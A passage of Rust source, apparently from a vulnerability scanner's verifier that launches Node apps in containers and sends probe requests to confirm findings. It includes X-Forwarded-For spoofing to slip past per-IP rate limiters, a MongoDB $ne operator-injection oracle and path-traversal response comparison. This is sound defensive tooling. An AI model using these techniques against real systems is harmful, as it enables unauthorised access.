            && w.bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-' | b'/' | b'@'))
    };
    if !plain(file)
        || ![".js", ".mjs", ".cjs"]
            .iter()
            .any(|ext| file.ends_with(ext))
    {
        return None;
    }
    // Only output redirections may follow: `> /dev/null`, `>>log`, `2>&1`.
    while let Some(word) = words.next() {
        let op = word.trim_start_matches(|c: char| c.is_ascii_digit());
        let target = op.strip_prefix(">>").or_else(|| op.strip_prefix('>'))?;
        let target = match target {
            "" => words.next()?,
            t => t,
        };
        let duplicate = target
            .strip_prefix('&')
            .is_some_and(|fd| !fd.is_empty() && fd.bytes().all(|b| b.is_ascii_digit()));
        if !duplicate && !plain(target) {
            return None;
        }
    }
    Some(file)
}

/// The JavaScript entry file a start script hands to a Node process manager, when that is all it
/// does: `pm2 start server.js --name GC`, `pm2-runtime server.js`, `pm2-runtime start app.js`,
/// `forever start server.js`, or `nodemon index.js`. Production managers daemonize and a development
/// watcher can keep its parent alive while repeatedly restarting a failed child; neither behavior is
/// useful to a one-shot verifier. The honest equivalent is to run the same entry directly with
/// `node`. The launcher name may carry a path prefix (`./node_modules/.bin/pm2`); an optional `start`
/// subcommand is skipped, and the entry is the first following non-flag token, which must be a plain
/// `.js`/`.cjs`/`.mjs` filename. A manager pointed at an ecosystem/config file is excluded by the
/// caller requiring the resolved file to be a standalone server. Anything else (a chained command,
/// `&&`, a pipe) yields `None`.
fn process_manager_script(script: &str) -> Option<&str> {
    const MANAGERS: [&str; 5] = ["pm2", "pm2-runtime", "pm2-dev", "forever", "nodemon"];
    let script = script.trim();
    if script.contains("&&") || script.contains('|') || script.contains(';') {
        return None;
    }
    let mut words = script.split_whitespace();
    let program = words.next()?;
    let program = program.rsplit('/').next().unwrap_or(program);
    if !MANAGERS.contains(&program) {
        return None;
    }
    let mut next = words.next()?;
    if next == "start" {
        next = words.next()?;
    }
    // Skip leading flags (`forever -a server.js`); the entry is the first non-flag token.
    while next.starts_with('-') {
        next = words.next()?;
    }
    let plain = !next.is_empty()
        && next
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-' | b'/' | b'@'));
    let is_js = [".js", ".mjs", ".cjs"]
        .iter()
        .any(|ext| next.ends_with(ext));
    (plain && is_js).then_some(next)
}

/// A package script that consists solely of `node <local-js-file> [literal arguments...]`, encoded
/// as the exec-form JSON argv used by the verifier. Shell operators, expansions, quoting and
/// redirections are rejected rather than reinterpreted. npm's conventional trailing `$@` forwarding
/// placeholder is omitted because the verifier supplies no forwarded arguments.
fn direct_node_command(script: &str, root: &std::path::Path) -> Option<String> {
    let mut words = script.split_whitespace();
    if words.next()? != "node" {
        return None;
    }
    let file = package_file(root, words.next()?)?;
    if ![".js", ".cjs", ".mjs"]
        .iter()
        .any(|extension| file.ends_with(extension))
    {
        return None;
    }
    let mut argv = vec!["node".to_owned(), file];
    let mut arguments = words.peekable();
    while let Some(word) = arguments.next() {
        if word == "$@" && arguments.peek().is_none() {
            continue;
        }
        let literal = !word.is_empty()
            && word.bytes().all(|byte| {
                byte.is_ascii_alphanumeric()
                    || matches!(
                        byte,
                        b'.' | b'_' | b'-' | b'/' | b':' | b'=' | b'@' | b',' | b'+'
                    )
            });
        if !literal {
            return None;
        }
        argv.push(word.to_owned());
    }
    serde_json::to_string(&argv).ok()
}

/// The JavaScript launcher file a `start`/`dev` script runs directly with `node`, when that is all
/// the script does (`node scripts/dev.js`). An optional trailing argument list is allowed (the
/// launcher's own `argv`); a chained command (`&&`, `;`, a pipe, a background `&`) is not a plain
/// launcher and yields `None`. The file must resolve inside the package.
fn node_launcher_file(script: &str, root: &std::path::Path) -> Option<String> {
    let script = script.trim();
    if script.contains("&&") || script.contains('|') || script.contains(';') || script.contains('&')
    {
        return None;
    }
    let mut words = script.split_whitespace();
    if words.next()? != "node" {
        return None;
    }
    let file = words.next()?;
    if !["js", "cjs", "mjs"]
        .iter()
        .any(|ext| file.ends_with(&format!(".{ext}")))
    {
        return None;
    }
    package_file(root, file)
}

/// The Next.js project directory of a package, relative to its root: the directory holding a
/// `next.config.*` together with an `app/` or `pages/` routes directory. Checked at the package root
/// and under `src/` (a launcher that runs `next dev src` keeps the Next project under `src/`).
/// Returns `""` for a root-level project (no directory argument needed) or the subdirectory name.
fn next_app_dir(root: &std::path::Path) -> Option<String> {
    for candidate in ["", "src"] {
        let dir = if candidate.is_empty() {
            root.to_path_buf()
        } else {
            root.join(candidate)
        };
        let has_config = [
            "next.config.ts",
            "next.config.js",
            "next.config.mjs",
            "next.config.cjs",
        ]
        .iter()
        .any(|name| dir.join(name).is_file());
        let has_routes = dir.join("app").is_dir() || dir.join("pages").is_dir();
        if has_config && has_routes {
            return Some(candidate.to_owned());
        }
    }
    None
}

/// The direct Next launch command for an app whose `start`/`dev` script delegates to a launcher that
/// boots an ephemeral `mongodb-memory-server` and then execs the Next server. See the caller: the
/// in-process MongoDB download fails offline, so run Next directly against the sidecar MongoDB the
/// verifier supplies (`MONGO_URI`), which is the app's own production mode. `None` unless a launcher
/// script genuinely uses `mongodb-memory-server` and runs Next, and the Next project directory is
/// found — so this never fires for an app that does not bundle an ephemeral MongoDB.
fn ephemeral_mongo_next_launch(
    root: &std::path::Path,
    scripts: Option<&serde_json::Map<String, serde_json::Value>>,
) -> Option<String> {
    let scripts = scripts?;
    let launcher = ["start", "dev"]
        .iter()
        .filter_map(|key| scripts.get(*key).and_then(serde_json::Value::as_str))
        .find_map(|script| node_launcher_file(script, root))?;
    let src = std::fs::read_to_string(root.join(&launcher)).ok()?;
    if !src.contains("mongodb-memory-server") {
        return None;
    }
    let runs_next = src.contains("next dev") || src.contains("next start");
    if !runs_next {
        return None;
    }
    let dir = next_app_dir(root)?;
    let dir_arg = if dir.is_empty() {
        String::new()
    } else {
        format!(" {dir}")
    };
    // Next reads `PORT` from the environment (the verifier exports it); `-p "$PORT"` makes it
    // explicit. `exec` hands the container's signal handling to Next directly.
    Some(format!(
        "[\"sh\",\"-c\",\"exec npx next dev{dir_arg} --hostname 0.0.0.0 -p \\\"$PORT\\\"\"]"
    ))
}

fn local_ephemeral_mongo_next_launch(root: &std::path::Path) -> Option<String> {
    let Ok(manifest) = std::fs::read_to_string(root.join("package.json")) else {
        return None;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&manifest) else {
        return None;
    };
    let scripts = json.get("scripts").and_then(serde_json::Value::as_object);
    ephemeral_mongo_next_launch(root, scripts)?;
    let dir = next_app_dir(root)?;
    let dir = if dir.is_empty() { "." } else { &dir };
    Some(format!(
        "[\"sh\",\"-c\",\"exec npm start -- {dir} \\\"$PORT\\\"\"]"
    ))
}

/// A cheap check for a `"start"` key under a `"scripts"` object. Good enough to decide launch;
/// the real command runs through npm.
fn has_start_script(manifest: &str) -> bool {
    manifest.split("\"scripts\"").nth(1).is_some_and(|scripts| {
        let head = &scripts[..scripts.floor_char_boundary(2000)];
        head.contains("\"start\"")
    })
}

/// The package (directory with a `package.json`, relative to `root`) that serves a route declared
/// in `file`. The nearest enclosing package when it can be launched: a separate service in a
/// subdirectory (`capture/`, `server/`) is its own app, not the repo root's. Otherwise the nearest
/// ancestor with a start script. When no enclosing package can be launched but the finding's own
/// file is a self-contained server, its own directory (so `node <file>` runs with the right
/// working directory); the repo root when none of these apply.
pub fn app_dir(root: &std::path::Path, file: &std::path::Path) -> std::path::PathBuf {
    let mut packages = Vec::new();
    let mut dir = file.parent();
    while let Some(current) = dir {
        if current.as_os_str().is_empty() {
            break;
        }
        if root.join(current).join("package.json").is_file() {
            packages.push(current.to_path_buf());
        }
        dir = current.parent();
    }
    // A module worker (`export default { fetch }`) is launched by the worker-host shim, not a package
    // start script, and its dependencies (`hono`, …) are declared in its nearest enclosing package.
    // Install and run there so its bare imports resolve, even though the package declares no `start`.
    if is_module_worker(&root.join(file))
        && let Some(nearest) = packages.first()
    {
        return nearest.clone();
    }
    if let Some(nearest) = packages.first()
        && manifest_start_command(&root.join(nearest)).is_some()
    {
        return nearest.clone();
    }
    if let Some(dir) = packages.iter().find(|dir| {
        std::fs::read_to_string(root.join(dir).join("package.json"))
            .is_ok_and(|manifest| has_start_script(&manifest))
    }) {
        return dir.clone();
    }
    // No launchable enclosing package: run the finding's own file in place when it is itself a
    // self-contained server, or a lifecycle server module the host shim can launch, so it does not
    // need a start script to be exercised. Its own directory is also where its dependencies are
    // declared, so installing there resolves the module's `require(...)`.
    if (is_standalone_server(&root.join(file))
        || is_lifecycle_server_module(&root.join(file))
        || is_route_handler_module(&root.join(file)))
        && let Some(parent) = file.parent()
    {
        return working_dir_for_cwd_paths(root, file, parent);
    }
    std::path::PathBuf::new()
}

/// The launch directory for a server file that is run in place. Normally its own directory, but a
/// file that opens working-directory-relative paths at startup (`readFileSync("config.json")`,
/// `resolve(process.cwd(), "public")`) was written to be run from an enclosing directory — a
/// `scripts/serve.mjs` invoked as `node scripts/serve.mjs` from the project root. When those paths
/// are missing beside the file but all present in an enclosing directory of the checkout, launch
/// from the nearest such directory; otherwise the server aborts on `ENOENT` before it listens.
fn working_dir_for_cwd_paths(
    root: &std::path::Path,
    file: &std::path::Path,
    own: &std::path::Path,
) -> std::path::PathBuf {
    let Ok(src) = std::fs::read_to_string(root.join(file)) else {
        return own.to_path_buf();
    };
    let paths = cwd_relative_literals(&src);
    let all_exist =
        |dir: &std::path::Path| paths.iter().all(|path| root.join(dir).join(path).exists());
    if paths.is_empty() || all_exist(own) {
        return own.to_path_buf();
    }
    own.ancestors()
        .skip(1)
        .find(|dir| all_exist(dir))
        .map_or_else(|| own.to_path_buf(), std::path::Path::to_path_buf)
}

/// Plain relative path literals a module resolves against the process working directory: the
/// first string argument of a synchronous/stream `fs` read, and a literal joined onto
/// `process.cwd()`. Paths anchored to `__dirname`/`import.meta` are not literals here, so they are
/// never counted; absolute, parent-escaping and templated paths are ignored.
fn cwd_relative_literals(src: &str) -> Vec<String> {
    const CALLS: [&str; 7] = [
        "readFileSync(",
        "readFile(",
        "existsSync(",
        "statSync(",
        "readdirSync(",
        "createReadStream(",
        "process.cwd(),",
    ];
    let mut out = Vec::new();
    for call in CALLS {
        for (at, _) in src.match_indices(call) {
            let rest = src[at + call.len()..].trim_start();
            let Some(quote) = rest.chars().next().filter(|c| matches!(c, '"' | '\'')) else {
                continue;
            };
            let Some(literal) = rest[1..].split(quote).next() else {
                continue;
            };
            let literal = literal.trim_start_matches("./");
            let candidate = std::path::Path::new(literal);
            let plain = !literal.is_empty()
                && !literal.contains(['\\', '\n', '$'])
                && candidate
                    .components()
                    .all(|part| matches!(part, std::path::Component::Normal(_)));
            if plain && !out.iter().any(|seen| seen == literal) {
                out.push(literal.to_owned());
            }
        }
    }
    out
}

/// The identity of the server process that serves a finding's route, used to decide when two
/// findings share one running app. Findings launched from a package manifest share one server, so
/// the launch directory identifies it. But a directory with no launchable manifest of its own runs
/// each finding's standalone server file directly (`node <file>`), so two such servers in one
/// directory (`src/web/server.js` and `src/web/dashboard.js`) are two different processes serving
/// different routes: each needs its own session keyed by its own entry file, or the second's route
/// is probed against the first's server and never reproduces.
pub fn session_key(
    root: &std::path::Path,
    app_path: &std::path::Path,
    entry_file: &std::path::Path,
) -> std::path::PathBuf {
    if let Ok(entry) = entry_file.strip_prefix(app_path)
        && let Some(entry) = entry.to_str()
        && let Some(file) = package_file(&root.join(app_path), entry)
        && is_standalone_server(&root.join(app_path).join(file))
    {
        return entry_file.to_path_buf();
    }
    if manifest_start_command(&root.join(app_path)).is_some() {
        app_path.to_path_buf()
    } else {
        entry_file.to_path_buf()
    }
}

/// The image working directory for an app directory relative to the repo: `/app` for the repo
/// root, `/app/<dir>` otherwise. `None` for a path that cannot appear safely in a Dockerfile.
fn container_dir(app: &std::path::Path) -> Option<String> {
    let mut out = String::from("/app");
    for part in app.components() {
        let std::path::Component::Normal(part) = part else {
            return None;
        };
        let part = part.to_str()?;
        if !part
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-' | b'@'))
        {
            return None;
        }
        out.push('/');
        out.push_str(part);
    }
    Some(out)
}

/// The request the driver sends, as a compact JSON spec on one argv slot.
fn request_spec(attempt: &Attempt, port: u16, forward: bool, tls: bool) -> String {
    let mut pairs: Vec<(String, String)> = attempt.headers.clone();
    // Give each driven request a distinct client address. A per-IP rate limiter buckets requests by
    // `X-Forwarded-For` (or a shared default when absent), so the scanner's own probe volume would
    // otherwise be counted as one client and throttled before the sink is reached — masking a real
    // finding behind the verifier's own traffic. A genuine single exploit request is never
    // throttled; spoofing an address does not neutralize the input or grant any access. Left alone
    // when a payload deliberately sets the header itself, and suppressed entirely (`forward` false)
    // on the loopback-origin retry — a forwarding header claims a reverse-proxy hop the verifier is
    // not, which an app that trusts only genuine loopback peers reads as remote and refuses.
    if forward
        && !pairs
            .iter()
            .any(|(k, _)| k.eq_ignore_ascii_case("x-forwarded-for"))
    {
        let seq = REQUEST_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        pairs.push((
            "X-Forwarded-For".to_owned(),
            format!(
                "10.{}.{}.{}",
                (seq >> 16) & 0xff,
                (seq >> 8) & 0xff,
                seq & 0xff
            ),
        ));
    }
    let headers = pairs
        .iter()
        .map(|(k, v)| format!("\"{}\":\"{}\"", esc(k), esc(v)))
        .collect::<Vec<_>>()
        .join(",");
    let body = match &attempt.body {
        Some(b) => format!("\"{}\"", esc(b)),
        None => "null".to_owned(),
    };
    format!(
        "{{\"port\":{port},\"method\":\"{}\",\"path\":\"{}\",\"headers\":{{{headers}}},\"body\":{body},\"tls\":{tls}}}",
        attempt.verb,
        esc(&attempt.target)
    )
}

fn binary_request_spec(
    port: u16,
    method: &str,
    path: &str,
    headers: &[(String, String)],
    body: &[u8],
    tls: bool,
) -> String {
    let headers: serde_json::Map<String, serde_json::Value> = headers
        .iter()
        .cloned()
        .map(|(name, value)| (name, serde_json::Value::String(value)))
        .collect();
    serde_json::json!({
        "port": port,
        "method": method,
        "path": path,
        "headers": headers,
        "body": null,
        "bodyBase64": base64(body),
        "tls": tls,
    })
    .to_string()
}

fn multipart_file(
    boundary: &str,
    field: &str,
    filename: &str,
    content_type: &str,
    bytes: &[u8],
) -> Vec<u8> {
    let mut body = format!(
        "--{boundary}\r\nContent-Disposition: form-data; name=\"{field}\"; filename=\"{filename}\"\r\nContent-Type: {content_type}\r\n\r\n"
    )
    .into_bytes();
    body.extend_from_slice(bytes);
    body.extend_from_slice(format!("\r\n--{boundary}--\r\n").as_bytes());
    body
}

/// A minimal one-entry ZIP using the stored method. Keeping this dependency-free makes the
/// verifier work in the same stripped-down release binary as every other payload generator.
fn stored_zip(name: &str, contents: &[u8]) -> Vec<u8> {
    let name = name.as_bytes();
    let crc = crc32(contents);
    let size = u32::try_from(contents.len()).unwrap_or(u32::MAX);
    let name_len = u16::try_from(name.len()).unwrap_or(u16::MAX);
    let mut out = Vec::new();
    push_u32(&mut out, 0x0403_4b50);
    push_u16(&mut out, 20);
    push_u16(&mut out, 0);
    push_u16(&mut out, 0);
    push_u16(&mut out, 0);
    push_u16(&mut out, 0);
    push_u32(&mut out, crc);
    push_u32(&mut out, size);
    push_u32(&mut out, size);
    push_u16(&mut out, name_len);
    push_u16(&mut out, 0);
    out.extend_from_slice(name);
    out.extend_from_slice(contents);

    let central_offset = u32::try_from(out.len()).unwrap_or(u32::MAX);
    push_u32(&mut out, 0x0201_4b50);
    push_u16(&mut out, 20);
    push_u16(&mut out, 20);
    push_u16(&mut out, 0);
    push_u16(&mut out, 0);
    push_u16(&mut out, 0);
    push_u16(&mut out, 0);
    push_u32(&mut out, crc);
    push_u32(&mut out, size);
    push_u32(&mut out, size);
    push_u16(&mut out, name_len);
    push_u16(&mut out, 0);
    push_u16(&mut out, 0);
    push_u16(&mut out, 0);
    push_u16(&mut out, 0);
    push_u32(&mut out, 0);
    push_u32(&mut out, 0);
    out.extend_from_slice(name);
    let central_size = u32::try_from(out.len()).unwrap_or(u32::MAX) - central_offset;

    push_u32(&mut out, 0x0605_4b50);
    push_u16(&mut out, 0);
    push_u16(&mut out, 0);
    push_u16(&mut out, 1);
    push_u16(&mut out, 1);
    push_u32(&mut out, central_size);
    push_u32(&mut out, central_offset);
    push_u16(&mut out, 0);
    out
}

fn push_u16(out: &mut Vec<u8>, value: u16) {
    out.extend_from_slice(&value.to_le_bytes());
}

fn push_u32(out: &mut Vec<u8>, value: u32) {
    out.extend_from_slice(&value.to_le_bytes());
}

fn crc32(bytes: &[u8]) -> u32 {
    let mut crc = u32::MAX;
    for byte in bytes {
        crc ^= u32::from(*byte);
        for _ in 0..8 {
            let mask = 0u32.wrapping_sub(crc & 1);
            crc = (crc >> 1) ^ (0xedb8_8320 & mask);
        }
    }
    !crc
}

fn esc(text: &str) -> String {
    text.chars()
        .flat_map(|c| match c {
            '"' => vec!['\\', '"'],
            '\\' => vec!['\\', '\\'],
            '\n' => vec!['\\', 'n'],
            '\r' => vec!['\\', 'r'],
            other => vec![other],
        })
        .collect()
}

/// Removes a request's own path and raw value from a response body, so the read oracle compares
/// the *structure* of two responses (a file-found page versus a not-found page) rather than the
/// requested identifier a not-found page reflects back. Both the request target and the decoded
/// traversal value are stripped, since a handler may echo either form.
fn strip_request_echo(body: &str, target: &str, value: &str) -> String {
    let mut out = body.to_owned();
    for needle in [target, value] {
        if !needle.is_empty() {
            out = out.replace(needle, "");
        }
    }
    out
}

/// Keep the report and downstream advisory text safe when a differential oracle's successful
/// branch returns an image or another binary body. The full body is still used above for the
/// three-way comparison; only the human-facing excerpt is replaced.
fn response_excerpt(body: &str) -> String {
    const MAX_CHARS: usize = 400;
    let excerpt: String = body.trim().chars().take(MAX_CHARS).collect();
    let binary = excerpt.chars().any(|character| {
        character == '\0'
            || character == '\u{fffd}'
            || (character.is_control() && !matches!(character, '\n' | '\r' | '\t'))
    });
    if binary {
        format!("[binary response omitted; {} bytes captured]", body.len())
    } else {
        excerpt
    }
}

fn control_observation(label: &str, attempt: &Attempt, response: &str) -> ControlObservation {
    ControlObservation {
        label: label.to_owned(),
        method: attempt.verb.to_owned(),
        target: attempt.target.clone(),
        body: attempt.body.clone(),
        response: response_excerpt(response),
    }
}

fn nosql_differential_evidence(field: &str, body_query_override: bool) -> String {
    let mut evidence = format!(
        "a match-all operator (`{field}: {{$ne}}`) returned a record that the match-none operators \
         (`$eq`, `$in: []`) did not, proving the object was interpreted as a MongoDB query operator \
         rather than a scalar"
    );
    if body_query_override {
        evidence.push_str(&format!(
            "; the request kept a validator-compatible scalar `{field}` in the JSON body and sent \
             the operator in the same-named query field, which the handler's ordered \
             `{{ ...request.body, ...request.query }}` merge applies last"
        ));
    }
    evidence
}

fn tail(text: &str, lines: usize) -> String {
    let all: Vec<&str> = text.lines().collect();
    all.get(all.len().saturating_sub(lines)..)
        .unwrap_or_default()
        .join("\n")
}

fn docker(args: &[&str]) -> Result<String, String> {
    let output = Command::new("docker")
        .args(docker_args(args))
        .output()
        .map_err(|e| e.to_string())?;
    if output.status.success() {
        Ok(String::from_utf8_lossy(&output.stdout).into_owned())
    } else {
        Err(String::from_utf8_lossy(&output.stderr).trim().to_owned())
    }
}

fn remove_container(name: &str) {
    // `-v` removes anonymous volumes declared by base images. Without it, every
    // verification leaves those volumes behind after the container is removed.
    let _ = docker(&["rm", "-f", "-v", name]);
}

fn docker_args(args: &[&str]) -> Vec<String> {
    let label = std::env::var("JSS_VERIFY_RUN_LABEL").ok();
    docker_args_with_label(args, label.as_deref())
}

fn docker_args_with_label(args: &[&str], label: Option<&str>) -> Vec<String> {
    let label = label.filter(|value| {
        !value.is_empty()
            && value.len() <= 64
            && value
                .bytes()
                .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_'))
    });
    let insertion = match args {
        ["run" | "build", ..] => 1,
        ["network", "create", ..] => 2,
        _ => 0,
    };
    let mut command = Vec::with_capacity(args.len() + 2);
    for (index, arg) in args.iter().enumerate() {
        command.push((*arg).to_owned());
        if index + 1 == insertion
            && let Some(label) = label
        {
            command.push("--label".to_owned());
            command.push(format!("{VERIFY_RUN_LABEL_KEY}={label}"));
        }
    }
    command
}

fn run_id() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    format!("{nanos:x}")
}

/// A short, process-unique suffix for the canary token. Not cryptographic: it only has to be
/// unlikely to appear in the app's own output within one run.
fn short_rand() -> String {
    let addr = &short_rand as *const _ as usize;
    let pid = std::process::id();
    format!("{:x}{:x}", addr & 0xffff_ffff, pid)
}

/// A Node `--require` preload that lets an application boot when it `require`s a *bare* module the
/// repository never declared (so `npm install` never fetched it). Such a dependency is almost always
/// unrelated to the route under test — a real-time/analytics/optional add-on — yet an unresolved
/// top-level `require` aborts the whole process before it can `listen`, which would otherwise leave
/// a genuinely reachable sink un-exercised. Only bare specifiers that fail to resolve are replaced
/// with an inert stub; a missing *relative* file, or any specifier that resolves normally, is left
/// exactly as Node handles it. The stub cannot manufacture a result: a verification still requires
/// the real canary to flow through the real sink into the response.
const LAUNCH_SHIM_JS: &str = r#"
'use strict';
const Module = require('module');
const origLoad = Module._load;

if (process.env.JSS_MONGODB_CALLBACK_PROMISES === '1') {
  try {
    const mongodb = require('mongodb');
    const proto = mongodb && mongodb.Db && mongodb.Db.prototype;
    const originalCollections = proto && proto.collections;
    if (typeof originalCollections === 'function') {
      proto.collections = function (options, callback) {
        if (typeof options === 'function' || typeof callback === 'function') {
          return originalCollections.apply(this, arguments);
        }
        const db = this;
        return new Promise(function (resolve, reject) {
          let settled = false;
          const done = function (error, collections) {
            if (settled) return;
            settled = true;
            if (error) reject(error);
            else resolve(collections);
          };
          let returned;
          try {
            returned = originalCollections.call(db, options || {}, done);
          } catch (error) {
            done(error);
            return;
          }
          // MongoDB 3.x completes through `done`; 4.x and newer ignore the callback and return a
          // Promise. Follow whichever contract the installed driver actually implements instead
          // of replacing the real operation or leaving the compatibility Promise pending.
          if (returned && typeof returned.then === 'function') {
            returned.then(function (collections) { done(null, collections); }, done);
          } else if (returned !== undefined) {
            done(null, returned);
          }
        });
      };
    }
  } catch (error) {}
}

const handler = {
  get: function (target, prop) {
    if (prop === 'then') return undefined;
    if (prop === Symbol.toPrimitive) return function () { return ''; };
    if (prop === Symbol.iterator || prop === Symbol.asyncIterator) return undefined;
    return stub;
  },
  apply: function () { return stub; },
  construct: function () { return stub; },
};
const stub = new Proxy(function () {}, handler);
const guarded = new Set(
  (process.env.JSS_GUARDED_MODULES || '').split(',').map(function (s) { return s.trim(); }).filter(Boolean)
);
function packageRoot(request) {
  if (request[0] === '@') {
    const parts = request.split('/');
    return parts.length >= 2 ? parts[0] + '/' + parts[1] : request;
  }
  return request.split('/')[0];
}
Module._load = function (request, parent, isMain) {
  try {
    return origLoad.apply(this, arguments);
  } catch (err) {
    if (
      err && err.code === 'MODULE_NOT_FOUND' &&
      typeof request === 'string' &&
      request.length > 0 &&
      request[0] !== '.' && request[0] !== '/' &&
      request.slice(0, 5) !== 'node:'
    ) {
      // A module the app `require`s inside a `try`/`catch` (an optional native/platform bridge) is
      // one it is written to run without: let the real failure reach its own `catch` fallback, the
      // way it would off-device, rather than inject a stub whose truthy value crashes that fallback.
      if (guarded.has(request) || guarded.has(packageRoot(request))) throw err;
      return stub;
    }
    throw err;
  }
};
try {
  if (typeof Module.register === 'function') {
    Module.register(require('url').pathToFileURL('/jss-esm-hook.mjs').href);
  }
} catch (err) {}
"#;

/// ESM counterpart of [`LAUNCH_SHIM_JS`]. Only an undeclared bare module that fails with
/// `ERR_MODULE_NOT_FOUND` is replaced; relative files and other resolver failures retain Node's
/// behavior. Named imports are recovered from the importing statement so the inert stub can link.
const LAUNCH_ESM_HOOK_JS: &str = r#"
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

const SCHEME = 'jss-stub:';

function isBare(specifier) {
  return typeof specifier === 'string' && specifier.length > 0 &&
    specifier[0] !== '.' && specifier[0] !== '/' &&
    !specifier.startsWith('node:') && !specifier.startsWith('data:') &&
    !specifier.startsWith('file:');
}

export async function resolve(specifier, context, nextResolve) {
  try {
    return await nextResolve(specifier, context);
  } catch (error) {
    if (!isBare(specifier) || !error || error.code !== 'ERR_MODULE_NOT_FOUND') throw error;
    const parent = context && typeof context.parentURL === 'string' ? context.parentURL : '';
    return {
      url: SCHEME + encodeURIComponent(specifier) + '?parent=' + encodeURIComponent(parent),
      shortCircuit: true,
    };
  }
}

function requestedNames(parentURL, specifier) {
  const names = new Set();
  if (!parentURL.startsWith('file:')) return names;
  let source;
  try { source = readFileSync(fileURLToPath(parentURL), 'utf8'); } catch (error) { return names; }
  const escaped = specifier.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const imports = new RegExp("import\\s+([^;]*?)\\s+from\\s+['\"]" + escaped + "['\"]", 'g');
  let match;
  while ((match = imports.exec(source))) {
    const braces = match[1].match(/\{([^}]*)\}/);
    if (!braces) continue;
    for (let part of braces[1].split(',')) {
      part = part.trim();
      if (!part) continue;
      const at = part.search(/\sas\s/);
      const name = (at >= 0 ? part.slice(0, at) : part).trim();
      if (name !== 'default' && /^[A-Za-z_$][A-Za-z0-9_$]*$/.test(name)) names.add(name);
    }
  }
  return names;
}

export async function load(url, context, nextLoad) {
  if (!url.startsWith(SCHEME)) return nextLoad(url, context);
  const rest = url.slice(SCHEME.length);
  const query = rest.indexOf('?parent=');
  const specifier = decodeURIComponent(query >= 0 ? rest.slice(0, query) : rest);
  const parent = query >= 0 ? decodeURIComponent(rest.slice(query + 8)) : '';
  const lines = [
    "const handler = { get(t, p) { if (p === 'then') return undefined; if (p === Symbol.toPrimitive) return () => ''; if (p === Symbol.iterator || p === Symbol.asyncIterator) return undefined; return stub; }, apply() { return stub; }, construct() { return stub; } };",
    'const stub = new Proxy(function () {}, handler);',
    'export default stub;',
  ];
  for (const name of requestedNames(parent, specifier)) lines.push('export const ' + name + ' = stub;');
  return { format: 'module', source: lines.join('\n'), shortCircuit: true };
}
"#;

/// Mounts a plug-in handler module that registers an HTTP request handler on a host-provided service
/// but never listens itself (a cordis/koishi-style `apply(ctx)` that calls `webServer.register({
/// path, handler })`). The shim imports the module, runs its `apply` against a permissive mock host
/// context whose service `register`/`route` calls capture the request handler, then serves the
/// captured handler(s) over HTTP on `PORT`. It fabricates nothing: a verification still requires the
/// real canary to flow through the module's own handler into the real sink. Dependency-free (core
/// `http`); imports the target with dynamic `import()`, so it mounts ESM and CommonJS modules alike.
const PLUGIN_HOST_JS: &str = r#"
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

const port = Number(process.env.PORT || 3000);
const target = path.resolve(process.cwd(), process.argv[2] || '');
const routes = [];

function capture(args) {
  for (const a of args) {
    if (a && typeof a === 'object' && typeof a.handler === 'function') {
      routes.push({ path: typeof a.path === 'string' ? a.path : '/', kind: a.kind, handler: a.handler });
      return;
    }
  }
  const strs = args.filter((a) => typeof a === 'string');
  const fns = args.filter((a) => typeof a === 'function');
  if (fns.length) routes.push({ path: strs.length ? strs[strs.length - 1] : '/', handler: fns[fns.length - 1] });
}

const REGISTER = new Set(['register', 'route', 'addRoute', 'use', 'get', 'post', 'put', 'patch', 'delete', 'all', 'any']);

function service() {
  const self = function () { return self; };
  return new Proxy(self, {
    get(_t, prop) {
      if (prop === 'then') return undefined;
      if (prop === Symbol.toPrimitive) return () => '';
      if (prop === 'getOrigin' || prop === 'getUrl' || prop === 'origin') return () => 'http://127.0.0.1:' + port;
      if (typeof prop === 'string' && REGISTER.has(prop)) return (...a) => { capture(a); return () => {}; };
      return service();
    },
    apply() { return service(); },
  });
}

function context() {
  const ctx = new Proxy(function () {}, {
    get(_t, prop) {
      if (prop === 'then') return undefined;
      if (prop === Symbol.toPrimitive) return () => '';
      if (prop === 'inject') return (_deps, cb) => { if (typeof cb === 'function') return cb(ctx); };
      if (prop === 'effect' || prop === 'defer' || prop === 'collect') return (fn) => { if (typeof fn === 'function') { try { return fn(); } catch (e) {} } };
      if (prop === 'on' || prop === 'once' || prop === 'plugin' || prop === 'using' || prop === 'command') return () => ctx;
      return service();
    },
    apply() { return ctx; },
  });
  return ctx;
}

try {
  const mod = await import(pathToFileURL(target).href);
  const plugin = (mod && mod.default != null) ? mod.default : mod;
  const ctx = context();
  if (typeof plugin === 'function') plugin(ctx, {});
  else if (plugin && typeof plugin.apply === 'function') plugin.apply(ctx, {});
} catch (e) {
  console.error('[plugin-host] load error: ' + (e && e.message));
}
console.error('[plugin-host] routes: ' + routes.map((r) => (r.kind || 'exact') + ' ' + r.path).join(', '));

function match(r, url) {
  const p = url.split('?')[0].split('#')[0];
  if (r.kind === 'prefix') { const base = r.path.replace(/\/+$/, ''); return p === base || p.startsWith(base + '/'); }
  return p === r.path;
}

http.createServer((req, res) => {
  for (const r of routes) {
    if (match(r, req.url)) {
      try { Promise.resolve(r.handler(req, res)).catch(() => { try { if (!res.headersSent) res.writeHead(502); res.end(); } catch (e) {} }); }
      catch (e) { try { if (!res.headersSent) res.writeHead(502); res.end(); } catch (x) {} }
      return;
    }
  }
  res.writeHead(404); res.end('no route');
}).listen(port, '0.0.0.0', () => console.error('[plugin-host] listening on ' + port));
"#;

/// Mounts an Express router module that publishes routes but never listens itself (`export function
/// apiRouter(ws) { const r = express.Router(); …; return r; }`, wired into a server behind a CLI
/// subcommand the bare launch never reaches). The shim imports the target, collects every Express
/// router/app it exports — or that its exported factories return when called with a scratch base
/// directory — mounts them all on a fresh Express app, and serves it over HTTP on `PORT`. It
